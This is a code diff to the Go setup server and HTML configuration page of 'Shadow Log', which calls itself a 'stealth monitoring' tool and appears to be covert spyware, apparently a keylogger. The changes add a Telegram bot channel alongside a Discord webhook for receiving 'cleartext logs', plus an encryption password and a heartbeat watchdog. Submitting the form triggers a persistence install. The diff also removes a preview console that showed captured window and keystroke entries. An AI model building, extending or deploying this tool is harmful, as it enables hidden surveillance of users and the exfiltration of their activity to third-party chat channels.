@@ -24,7 +24,17 @@ func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)
 	mux := http.NewServeMux()
 	server := &http.Server{Addr: ":58291", Handler: mux}
 
-	// Handle the test webhook request.
+	var lastHeartbeat = time.Now()
+	var heartbeatMu sync.Mutex
+
+	mux.HandleFunc("/heartbeat", func(w http.ResponseWriter, r *http.Request) {
+		heartbeatMu.Lock()
+		lastHeartbeat = time.Now()
+		heartbeatMu.Unlock()
+		w.WriteHeader(http.StatusOK)
+	})
+
+	// Handle the test Discord webhook request.
 	mux.HandleFunc("/test", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != "POST" {
 			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
@@ -39,8 +49,7 @@ func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)
 			return
 		}
 
-		guid := config.GetMachineID()
-		payload := map[string]string{"content": fmt.Sprintf("🟢 **%s Connectivity Test**\n\n- **Status**: Operational\n- **Machine GUID**: `%s`\n- **Note**: This GUID is required for log decryption.", "Shadow Log", guid)}
+		payload := map[string]string{"content": fmt.Sprintf("🟢 **%s Connectivity Test**\n\n- **Status**: Operational\n- **Note**: This channel receives gracefully formatted telemetry.", "Shadow Log")}
 		pData, _ := json.Marshal(payload)
 
 		req, _ := http.NewRequest("POST", data.URL, bytes.NewBuffer(pData))
@@ -58,6 +67,44 @@ func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)
 		fmt.Fprint(w, "Test message sent successfully!")
 	})
 
+	// Handle the test Telegram request.
+	mux.HandleFunc("/test-telegram", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != "POST" {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+
+		var data struct {
+			Token  string `json:"token"`
+			ChatID string `json:"chat_id"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+			http.Error(w, "Invalid request", http.StatusBadRequest)
+			return
+		}
+
+		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", data.Token)
+		payload := map[string]string{
+			"chat_id":    data.ChatID,
+			"text":       "🟢 *Shadow Log Connectivity Test*\n\n• *Status*: Operational\n• Cleartext logs will be sent here.",
+			"parse_mode": "Markdown",
+		}
+		pData, _ := json.Marshal(payload)
+
+		req, _ := http.NewRequest("POST", apiURL, bytes.NewBuffer(pData))
+		req.Header.Set("Content-Type", "application/json")
+
+		client := &http.Client{Timeout: 10 * time.Second}
+		resp, err := client.Do(req)
+
+		if err != nil || resp.StatusCode >= 400 {
+			w.WriteHeader(http.StatusBadRequest)
+			fmt.Fprint(w, "Failed to send test message. Check your Token and Chat ID.")
+			return
+		}
+		fmt.Fprint(w, "Telegram test sent successfully!")
+	})
+
 	// Handle GET (show form) and POST (process form) requests.
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		switch r.Method {
@@ -67,8 +114,16 @@ func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)
 		case "POST":
 			r.ParseForm()
 			cfg.WebhookURL = r.FormValue("webhook_url")
+			cfg.TelegramToken = r.FormValue("telegram_token")
+			cfg.TelegramChatID = r.FormValue("telegram_chat_id")
+			cfg.EncryptionPassword = r.FormValue("encryption_password")
 			cfg.LogLocal = r.FormValue("log_local") == "on"
 			cfg.IsInstalled = true
+
+			// Set the encryption password for runtime.
+			if cfg.EncryptionPassword != "" {
+				config.SetEncryptionPassword(cfg.EncryptionPassword)
+			}
 
 			config.SaveConfig(cfg)
 			persistence.Install()
@@ -79,45 +134,37 @@ func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)
 			go func() {
 				time.Sleep(2000 * time.Millisecond)
 				server.Shutdown(context.Background())
-				wg.Done()
 			}()
 		}
 	})
 
-	// Flag to track if the server successfully started.
-	serverStarted := make(chan bool)
+	// Watchdog goroutine to close the app if the user closes the setup tab arbitrarily
+	go func() {
+		for {
+			time.Sleep(5 * time.Second)
+			heartbeatMu.Lock()
+			elapsed := time.Since(lastHeartbeat)
+			heartbeatMu.Unlock()
+			if elapsed > 15 * time.Second {
+				fmt.Println("Heartbeat lost. Shutting down Setup UI...")
+				server.Shutdown(context.Background())
+				return
+			}
+		}
+	}()
 
 	go func() {
 		url := "http://localhost:58291"
-		// Wait a bit for the server to spin up.
-		<-serverStarted
+		time.Sleep(1 * time.Second)
 		openBrowser(url)
 	}()
 
-	go func() {
-		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
-			// If blocked, we exit to prevent a silent hung process.
-			fmt.Printf("Setup server error: %v\n", err)
-			wg.Done()
-			return
-		}
-		serverStarted <- true
-	}()
-
-	// Safety: Ensure we don't hang if server fails immediately.
-	go func() {
-		time.Sleep(1 * time.Second)
-		select {
-		case serverStarted <- true:
-		default:
-		}
-	}()
+	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+		fmt.Printf("Setup server error: %v\n", err)
+	}
+	wg.Done() // Ensure waitgroup unblocks regardless of how the server closed
 
 	wg.Wait()
-	// Real monitor will start after setup server closes, handled by main.go calling the returned func again if needed,
-	// but here we already started it in a goroutine for the preview. 
-	// To avoid duplicate hooks, we might need a way to stop the preview logger or just transition.
-	// For now, let's just exit and let main.go call startLogger(cfg, nil)() which is correct.
 }
 
 func openBrowser(url string) {
@@ -182,12 +229,13 @@ const htmlContent = `
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            overflow: hidden;
+            padding: 40px 0;
+            overflow-y: auto;
         }
 
         .container {
             width: 100%;
-            max-width: 440px;
+            max-width: 900px;
             padding: 20px;
             animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
         }
@@ -203,10 +251,10 @@ const htmlContent = `
             -webkit-backdrop-filter: blur(40px);
             border: 1px solid var(--card-border);
             border-radius: 24px;
-            padding: 48px;
             box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.8);
             position: relative;
             overflow: hidden;
+            display: flex;
         }
 
         .card::before {
@@ -214,34 +262,57 @@ const htmlContent = `
             position: absolute;
             top: 0; left: 0; right: 0; height: 1px;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            z-index: 10;
         }
 
-        .header { margin-bottom: 32px; text-align: center; }
+        .branding-panel {
+            flex: 1;
+            background: linear-gradient(135deg, rgba(0, 120, 212, 0.1), transparent);
+            padding: 48px;
+            border-right: 1px solid var(--card-border);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .form-panel {
+            flex: 1.5;
+            padding: 48px;
+        }
 
         .logo-box {
-            width: 64px;
-            height: 64px;
+            width: 80px;
+            height: 80px;
             background: linear-gradient(135deg, rgba(0, 120, 212, 0.2), rgba(0, 120, 212, 0.05));
-            border-radius: 20px;
+            border-radius: 24px;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0 auto 20px;
+            margin: 0 auto 24px;
             color: var(--primary);
-            box-shadow: 0 0 30px var(--primary-glow);
+            box-shadow: 0 0 40px var(--primary-glow);
         }
 
         h1 {
-            font-size: 1.5rem;
+            font-size: 1.75rem;
             font-weight: 800;
             letter-spacing: -0.04em;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
 
         .subtitle {
             color: var(--text-dim);
-            font-size: 0.875rem;
+            font-size: 0.9375rem;
             font-weight: 500;
+        }
+        
+        .desc-text {
+            margin-top: 24px;
+            font-size: 0.85rem;
+            color: var(--text-dim);
+            line-height: 1.6;
         }
 
         .form-group { margin-bottom: 24px; }
@@ -257,8 +328,8 @@ const htmlContent = `
         }
 
         .input-wrapper { position: relative; }
-
-        input[type="url"] {
+        
+        .input-field {
             width: 100%;
             background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -270,7 +341,7 @@ const htmlContent = `
             transition: all 0.3s;
         }
 
-        input[type="url"]:focus {
+        .input-field:focus {
             outline: none;
             border-color: var(--primary);
             background: rgba(255, 255, 255, 0.05);
@@ -281,9 +352,9 @@ const htmlContent = `
             background: transparent;
             border: 1px solid var(--primary);
             color: var(--primary);
-            padding: 8px 16px;
+            padding: 10px 16px;
             border-radius: 10px;
-            font-size: 0.75rem;
+            font-size: 0.8rem;
             font-weight: 700;
             cursor: pointer;
             margin-top: 12px;
@@ -354,141 +425,100 @@ const htmlContent = `
         }
 
         .submit-btn:active { transform: translateY(0); }
-
-        /* Preview Console */
-        .preview-section {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
+        
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
         }
 
-        .console {
-            flex-grow: 1;
-            background: var(--console-bg);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 20px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            overflow-y: auto;
-            max-height: 400px;
-            min-height: 300px;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-
-        .console::-webkit-scrollbar {
-            width: 6px;
-        }
-
-        .console::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-        }
-
-        .log-entry {
-            display: flex;
-            gap: 8px;
-            animation: fadeInLog 0.3s ease-out;
-        }
-
-        @keyframes fadeInLog {
-            from { opacity: 0; transform: translateX(-5px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        .log-ts { color: var(--text-dim); flex-shrink: 0; }
-        .log-win { color: var(--primary); font-weight: 600; flex-shrink: 0; }
-        .log-val { color: #fff; word-break: break-all; }
-
-        .hidden-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 14px;
-            background: var(--primary);
-            margin-left: 2px;
-            animation: blink 1s infinite;
-            vertical-align: middle;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-
-        .preview-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .live-tag {
-            background: rgba(244, 63, 94, 0.15);
-            color: var(--danger);
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 0.65rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .live-tag::before {
-            content: '';
-            width: 6px;
-            height: 6px;
-            background: var(--danger);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.5); opacity: 0.5; }
-            100% { transform: scale(1); opacity: 1; }
+        @media (max-width: 768px) {
+            .card { flex-direction: column; }
+            .branding-panel { border-right: none; border-bottom: 1px solid var(--card-border); padding: 32px; }
+            .form-panel { padding: 32px; }
+            .grid-2 { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <div class="header">
+            <div class="branding-panel">
                 <div class="logo-box">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM15 9.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.7-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7 0 .3.1.5.3.7.2.2.5.3.7.3zM11 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM6.5 15.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                 </div>
                 <h1>Shadow Log</h1>
                 <p class="subtitle">Stealth Activity Analytics</p>
+                <p class="desc-text">Configure your unified stealth monitoring system. Enter credentials to securely transmit telemetry across direct encrypted channels.</p>
             </div>
 
-            <form action="/" method="POST" id="setupForm">
-                <div class="form-group">
-                    <label for="webhook_url">Endpoint Configuration</label>
-                    <div class="input-wrapper">
-                        <input type="url" id="webhook_url" name="webhook_url" value="{{ .WebhookURL }}" 
-                                 placeholder="https://..." required>
-                        <button type="button" class="test-btn" id="testBtn">Test Connection</button>
-                    </div>
-                    <div id="testStatus" class="test-status"></div>
-                </div>
-
-                <div class="form-group">
-                    <label class="checkbox-group">
-                        <input type="checkbox" name="log_local" {{ if .LogLocal }}checked{{ end }}>
-                        <div class="checkbox-label">
-                            <span class="checkbox-title">Resilient Local Cache</span>
-                            <span class="checkbox-desc">Preservere diagnostic data in deep system cache for offline stability.</span>
+            <div class="form-panel">
+                <form action="/" method="POST" id="setupForm">
+                    <div class="form-group">
+                        <label for="encryption_password">Encryption Password</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="encryption_password" name="encryption_password" class="input-field" value="{{ .EncryptionPassword }}"
+                                     placeholder="Strong password for log encryption" required>
                         </div>
-                    </label>
-                </div>
+                        <span style="font-size:0.7rem;color:var(--text-dim);margin-top:6px;display:block;">Used to encrypt local logs. Securely locks your forensic data.</span>
+                    </div>
 
-                <button type="submit" class="submit-btn" id="submitBtn">Initialize Service</button>
-            </form>
-        </div>
+                    <div class="section-divider" style="border-top:1px solid rgba(255,255,255,0.06);margin:28px 0;position:relative;">
+                        <span style="position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--card-bg);padding:0 12px;font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.15em;">Discord</span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="webhook_url">Discord Webhook URL</label>
+                        <div class="input-wrapper">
+                            <input type="url" id="webhook_url" name="webhook_url" class="input-field" value="{{ .WebhookURL }}" 
+                                     placeholder="https://discord.com/api/webhooks/...">
+                            <button type="button" class="test-btn" id="testBtn">Test Discord</button>
+                        </div>
+                        <div id="testStatus" class="test-status"></div>
+                    </div>
+
+                    <div class="section-divider" style="border-top:1px solid rgba(255,255,255,0.06);margin:28px 0;position:relative;">
+                        <span style="position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--card-bg);padding:0 12px;font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.15em;">Telegram</span>
+                    </div>
+
+                    <div class="grid-2">
+                        <div class="form-group">
+                            <label for="telegram_token">Telegram Bot Token</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="telegram_token" name="telegram_token" class="input-field" value="{{ .TelegramToken }}"
+                                         placeholder="123456:ABC-DEF...">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="telegram_chat_id">Telegram Chat ID</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="telegram_chat_id" name="telegram_chat_id" class="input-field" value="{{ .TelegramChatID }}"
+                                         placeholder="-1001234567890">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button type="button" class="test-btn" id="testTGBtn" style="margin-top:-10px; margin-bottom: 24px;">Test Telegram</button>
+                    <div id="testTGStatus" class="test-status" style="margin-top:-20px; margin-bottom: 20px;"></div>
+
+                    <div class="form-group">
+                        <label class="checkbox-group">
+                            <input type="checkbox" name="log_local" {{ if .LogLocal }}checked{{ end }}>
+                            <div class="checkbox-label">
+                                <span class="checkbox-title">Resilient Local Cache</span>
+                                <span class="checkbox-desc">Preserve diagnostic data in deep system cache for offline stability.</span>
+                            </div>
+                        </label>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn">Initialize Service</button>
+                </form>
+            </div>
+        </div>    </div>
 
     <script>
+        // Discord test
         const testBtn = document.getElementById('testBtn');
         const webhookInput = document.getElementById('webhook_url');
         const testStatus = document.getElementById('testStatus');
@@ -496,13 +526,13 @@ const htmlContent = `
         testBtn.addEventListener('click', async () => {
             const url = webhookInput.value;
             if (!url) {
-                showStatus('Missing Webhook URL', 'var(--danger)');
+                showStatus(testStatus, 'Missing Webhook URL', 'var(--danger)');
                 return;
             }
 
             testBtn.disabled = true;
             testBtn.textContent = 'Testing...';
-            showStatus('Pushing test payload...', 'var(--primary)');
+            showStatus(testStatus, 'Pushing test payload...', 'var(--primary)');
 
             try {
                 const response = await fetch('/test', {
@@ -512,22 +542,67 @@ const htmlContent = `
                 });
 
                 if (response.ok) {
-                    showStatus('Connection established.', 'var(--success)');
+                    showStatus(testStatus, 'Connection established.', 'var(--success)');
                 } else {
-                    showStatus('Connection rejected.', 'var(--danger)');
+                    showStatus(testStatus, 'Connection rejected.', 'var(--danger)');
                 }
             } catch (err) {
-                showStatus('Handshake failed.', 'var(--danger)');
+                showStatus(testStatus, 'Handshake failed.', 'var(--danger)');
             } finally {
                 testBtn.disabled = false;
-                testBtn.textContent = 'Test Connection';
+                testBtn.textContent = 'Test Discord';
             }
         });
 
-        function showStatus(text, color) {
-            testStatus.textContent = text;
-            testStatus.style.color = color;
+        // Telegram test
+        const testTGBtn = document.getElementById('testTGBtn');
+        const tgToken = document.getElementById('telegram_token');
+        const tgChatID = document.getElementById('telegram_chat_id');
+        const testTGStatus = document.getElementById('testTGStatus');
+
+        testTGBtn.addEventListener('click', async () => {
+            if (!tgToken.value || !tgChatID.value) {
+                showStatus(testTGStatus, 'Missing Token or Chat ID', 'var(--danger)');
+                return;
+            }
+
+            testTGBtn.disabled = true;
+            testTGBtn.textContent = 'Testing...';
+            showStatus(testTGStatus, 'Pushing test payload...', 'var(--primary)');
+
+            try {
+                const response = await fetch('/test-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: tgToken.value, chat_id: tgChatID.value })
+                });
+
+                if (response.ok) {
+                    showStatus(testTGStatus, 'Telegram connected.', 'var(--success)');
+                } else {
+                    showStatus(testTGStatus, 'Telegram rejected.', 'var(--danger)');
+                }
+            } catch (err) {
+                showStatus(testTGStatus, 'Telegram test failed.', 'var(--danger)');
+            } finally {
+                testTGBtn.disabled = false;
+                testTGBtn.textContent = 'Test Telegram';
+            }
+        });
+
+        function showStatus(el, text, color) {
+            el.textContent = text;
+            el.style.color = color;
         }
+
+        // Heartbeat mechanism to keep setup server alive while window is open
+        setInterval(async () => {
+            try {
+                await fetch('/heartbeat');
+            } catch (e) {
+                console.log('Setup server unreachable');
+            }
+        }, 2000);
     </script>
 </body>
 </html>
